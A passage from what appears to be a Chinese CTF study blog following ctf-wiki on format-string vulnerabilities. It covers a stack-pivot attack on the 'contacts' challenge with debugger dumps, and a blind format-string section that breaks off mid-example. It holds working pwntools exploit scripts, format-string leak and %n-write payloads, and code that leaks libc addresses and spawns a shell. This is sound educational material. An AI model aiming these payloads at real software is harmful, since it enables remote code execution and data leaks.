ebp;</code>）</p><p>同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存 ebp 的地址为多少，而这时 PrintInfo 函数中存储 ebp 的地址每次都在变化，而我们也无法通过其他方法得知。但是，<strong>程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址</strong>，所以我们可以修改其<strong>上层函数的保存的 ebp 的值，即上上层函数（即 main 函数）的 ebp 数值</strong>。这样当上层程序返回时，即实现了将栈迁移到堆的操作。</p><p>基本思路如下</p><ul><li><p>首先获取 system 函数的地址</p><ul><li>通过泄露某个 libc 函数的地址根据 libc database 确定。</li></ul></li><li><p>构造基本联系人描述为 system_addr + ‘bbbb’ + binsh_addr</p></li><li><p>修改上层函数保存的 ebp(即上上层函数的 ebp) 为<strong>存储 system_addr 的地址 -4</strong>。</p><p><strong>注解</strong>：</p><p>为什是<strong>system_addr 的地址 -4</strong> ？是因为程序末尾的 <code>leave;ret</code> 执行完 <code>leave</code> 后，esp 是指向 ebp 的，然后 esp 的值会增加一个机器长度（这时 esp 刚好是指向 eip ），再执行 ret 将 esp 指向的值压入 eip 中。</p></li><li><p>当主程序返回时，会有如下操作（第一第二合并等于 <code>leave</code> ）</p><ul><li>move esp,ebp，将 esp 指向 system_addr 的地址 - 4</li><li>pop ebp， 将 esp 指向 system_addr</li><li>ret，将 eip 指向 system_addr，从而获取 shell。</li></ul></li></ul><h4 id="获取相关地址与偏移"><a href="#获取相关地址与偏移" class="headerlink" title="获取相关地址与偏移"></a>获取相关地址与偏移</h4><p>这里我们主要是获取 system 函数地址、/bin/sh 地址，栈上存储联系人描述的地址，以及 PrintInfo 函数的地址。</p><p>首先，我们根据栈上存储的 libc_start_main_ret 地址 (该地址是当 main 函数执行返回时会运行的函数) 来获取 system 函数地址、/bin/sh 地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在 printf 处，并且一直运行到格式化字符串漏洞的 printf 函数处，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret    </span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret    </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd04│+0x08: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355</span><br><span class="line">0xffffcd0c│+0x10: 0x00000000</span><br><span class="line">0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line"><span class="meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0x804c420 <span class="string">&quot;1234567\n&quot;</span>)</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">1] 0x8048c27 → leave</span> </span><br><span class="line"><span class="meta">[#</span><span class="bash">2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">3] 0x80487a2 → jmp 0x80487b3</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">5] 0x80485e1 → hlt</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  dereference $esp 140</span><br><span class="line">[&#x27;$esp&#x27;, &#x27;140&#x27;]</span><br><span class="line">1</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">gef➤  dereference $esp l140</span><br><span class="line">[&#x27;$esp&#x27;, &#x27;l140&#x27;]</span><br><span class="line">140</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd04│+0x08: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355</span><br><span class="line">0xffffcd0c│+0x10: 0x00000000</span><br><span class="line">0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br><span class="line">0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1</span><br><span class="line">0xffffcd20│+0x24: 0x0804b0a8  →  &quot;11111&quot;</span><br><span class="line">0xffffcd24│+0x28: 0x00002b67 (&quot;g+&quot;?)</span><br><span class="line">0xffffcd28│+0x2c: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd2c│+0x30: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887</span><br><span class="line">0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd3c│+0x40: 0x00000000</span><br><span class="line">0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd44│+0x48: 0x00000000</span><br><span class="line">0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000</span><br><span class="line">0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3</span><br><span class="line">0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd54│+0x58: 0xffffcd68  →  0x00000004</span><br><span class="line">0xffffcd58│+0x5c: 0x00000050 (&quot;P&quot;?)</span><br><span class="line">0xffffcd5c│+0x60: 0x00000000</span><br><span class="line">0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000</span><br><span class="line">0xffffcd64│+0x68: 0x08048288  →  0x00000082</span><br><span class="line">0xffffcd68│+0x6c: 0x00000004</span><br><span class="line">0xffffcd6c│+0x70: 0x0000000a</span><br><span class="line">0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd78│+0x7c: 0x00000000</span><br><span class="line">0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br><span class="line">0xffffcd80│+0x84: 0x00000001</span><br><span class="line">0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span><br><span class="line">0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span><br></pre></td></tr></table></figure><p>我们可以通过简单的判断可以得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure><p>存储的是 __libc_start_main 的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31（格式化字符串在 0xffffcd00 ）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  fmtarg 0xffffcd7c</span><br><span class="line">The index of format argument : 32</span><br></pre></td></tr></table></figure><p>这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。</p><p>其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了寻址堆中指定联系人的 Description 的内存首地址，我们将格式化字符串 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] 保存在指定联系人的 Description 中。</p><p>再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br></pre></td></tr></table></figure><h4 id="构造联系人获取堆地址"><a href="#构造联系人获取堆地址" class="headerlink" title="构造联系人获取堆地址"></a>构造联系人获取堆地址</h4><p>得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的 ebp 地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[system_addr][bbbb][binsh_addr][%</span><span class="bash">6<span class="variable">$p</span>][%11<span class="variable">$p</span>][bbbb]</span></span><br></pre></td></tr></table></figure><p>来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。</p><p>这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。</p><p><strong>注解</strong>：</p><p>因为 PrintInfo 肯定是通过 main 函数调用的，而 main 函数一直没有结束，也就是一直在内存的某一固定位置。PrintInfo 是在 main 栈基础上往低地址生长的，所以只有 PrintInfo 结构固定 ebp 地址也不会因为我们再次调用而改变。PrintInfo 结构固定是因为所有输出内容（号码、描述等）都是以堆堆指针形式存储的，也就是无论长度如何变化在栈上所在空间都是不变的，ebp 的偏移也就是固定了。</p><p>在部分环境下，system 地址会出现 \ x00，导致 printf 的时候出现 0 截断导致无法泄露两个地址，因此可以将 payload 的修改如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[%</span><span class="bash">6<span class="variable">$p</span>][%11<span class="variable">$p</span>][ccc][system_addr][bbbb][binsh_addr][dddd]</span></span><br></pre></td></tr></table></figure><p>payload 修改为这样的话，还需要在 heap 上加入 12 的偏移。这样保证了 0 截断出现在泄露之后。<code>[%6$p]</code>：上层函数 ebp 地址；<code>[%11$p]</code>：堆块 fd 指针地址；</p><h4 id="修改-ebp"><a href="#修改-ebp" class="headerlink" title="修改 ebp"></a>修改 ebp</h4><p>由于我们需要执行 leave（ <del>move 指令将 ebp 赋给 esp，并还需要执行 pop ebp</del> ）才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 <code>move esp,ebp</code> 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。</p><p>上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 6，所以我们可以构造如下的 payload 来进行修改相应的值。(这里是 wiki 的修改方法，因为wiki exp 我本地打不通，换成自己的，所以修改方法也不一样)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">part1 = (heap_addr - <span class="number">4</span>) / <span class="number">2</span></span><br><span class="line">part2 = heap_addr - <span class="number">4</span> - part1</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(part1) + <span class="string">&#x27;x%&#x27;</span> + <span class="built_in">str</span>(part2) + <span class="string">&#x27;x%6$n&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h4><p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5 ，退出程序即会执行 ret 指令，就可以获取 shell。</p><h4 id="利用程序-2"><a href="#利用程序-2" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : contacts.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./contacts&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./contacts&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># 使用题目提供的libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">name,number,length,description</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name: &quot;</span>,name)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;No: &quot;</span>,number)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;description:\n&quot;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;remove? &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name,choose,newname=<span class="string">&#x27;skye&#x27;</span>,length=<span class="number">10</span>,description=<span class="string">&#x27;skye&#x27;</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change? &quot;</span>,name)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(choose))</span><br><span class="line"><span class="keyword">if</span>(choose==<span class="number">1</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name: &quot;</span>,newname)</span><br><span class="line"><span class="keyword">elif</span>(choose==<span class="number">2</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Description: \n&quot;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">creat(<span class="string">&quot;skye&quot;</span>,<span class="string">&quot;skye&quot;</span>,<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x18637</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ebp&amp;heap addr</span></span><br><span class="line"><span class="comment"># 将system前置可能会遇到\x00阻断，可自行后置，并调整ebp覆盖值</span></span><br><span class="line">payload = p32(system_addr) + <span class="string">&#x27;bbbb&#x27;</span> + p32(binsh_addr) + <span class="string">&#x27;%6$p%11$pcccc&#x27;</span></span><br><span class="line">creat(<span class="string">&#x27;2222&#x27;</span>, <span class="string">&#x27;skye&#x27;</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&#x27;cccc&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">data = data.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;ebp_addr:&quot;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite main_ebp</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(heap_addr-<span class="number">4</span>))</span><br><span class="line">creat(<span class="string">&#x27;3333&#x27;</span>, <span class="string">&#x27;skye&#x27;</span>, <span class="number">68</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x0804876A&#x27;)</span></span><br><span class="line"><span class="comment">#raw_input(&#x27;pause&#x27;)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。</p><p>为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的 ebp 的地址，也没有办法去把这个地址写到栈上，利用 $ 符号去定位他；因为没有办法定位，所以没有办法用 hn\hhn 等方式去写这个地址，只能用 n 方式去写，所以打印很多。</p><p><strong>注解</strong>：</p><p>我的脚本中用的不是 <code>system(&#39;/bin/sh&#39;)</code> ，而是 <code>system(&#39;sh&#39;)</code> ，这是因为用题目提供的 libc 搜索 /bin/sh 得到结果有误，得到的地址不是 /bin/sh ：</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_5.png" alt="fmrstr_5.png"></p><p>而去到 libcdatabase 得到结果是：<code>0xf7f60a0b</code>，里面有一个 0x0a 就是换行符嘛，这样会提前终止输入，所以也不行。最后使用题目提供 libc 搜索 sh ，成功 getshell 。</p><p>在我的环境（Ubuntu 16.04）没有遇到 system \x00 阻断，所以 payload 中 system 前置。如果遇到阻断，就将 system 后置，并调整 ebp 覆盖内容加上偏移即可。</p><h2 id="格式化字符串盲打"><a href="#格式化字符串盲打" class="headerlink" title="格式化字符串盲打"></a>格式化字符串盲打</h2><blockquote><p>ctf-wiki 上格式化字符串介绍不是很全面，我查了其他大佬的笔记，自己总结了：<a href="Bilnd_Pwn.md">Bilnd-格式化字符串盲打</a></p></blockquote><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>所谓格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们进行 pwn，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行</p><ul><li>确定程序的位数</li><li>确定漏洞位置</li><li>利用</li></ul><p>由于没找到比赛后给源码的题目，所以自己简单构造了两道题。</p><h3 id="例子-1-泄露栈"><a href="#例子-1-泄露栈" class="headerlink" title="例子 1 - 泄露栈"></a>例子 1 - 泄露栈</h3><p>源码和部署文件均放在了对应的文件夹 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack">fmt_blind_stack</a> 中。</p><h4 id="确定程序位数"><a href="#确定程序位数" class="headerlink" title="确定程序位数"></a>确定程序位数</h4><p>我们随便输入了 %p，程序回显如下信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_stack git:(master) ✗ nc localhost 9999</span><br><span class="line"><span class="meta">%</span><span class="bash">p</span></span><br><span class="line">0x7ffd4799beb0</span><br><span class="line">G�flag is on the stack%                          </span><br></pre></td></tr></table></figure><p>告诉我们 flag 在栈上，同时知道了该程序是 64 位的，而且应该有格式化字符串漏洞。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>那我们就一点一点测试看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">payload</span>):</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span> p64(<span class="built_in">int</span>(data, <span class="number">16</span>))</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>最后在输出中简单看了看，得到 flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">////////</span><br><span class="line">////////</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\xff</span><br><span class="line">flag&#123;thi</span><br><span class="line">s_is_fla</span><br><span class="line">g&#125;\x00\x00\x00\x00\x00\x00</span><br><span class="line">\x00\x00\x00\x00\xfe\x7f\x00\x00</span><br></pre></td></tr></table></figure><h3 id="例子-2-盲打劫持-got"><a href="#例子-2-盲打劫持-got" class="headerlink" title="例子 2 - 盲打劫持 got"></a>例子 2 - 盲打劫持 got</h3><p>源码以及部署文件均已经在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got">blind_fmt_got</a> 文件夹中。</p><h4 id="确定程序位数-1"><a href="#确定程序位数-1" class="headerlink" title="确定程序位数"></a>确定程序位数</h4><p>通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为 64 位。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_got git:(master) ✗ nc localhost 9999</span><br><span class="line"><span class="meta">%</span><span class="bash">p</span></span><br><span class="line">0x7fff3b9774c0</span><br></pre></td></tr></table></figure><p>这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。</p><h4 id="确定偏移-1"><a href="#确定偏移-1" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_got git:(master) ✗ nc localhost 9999</span><br><span 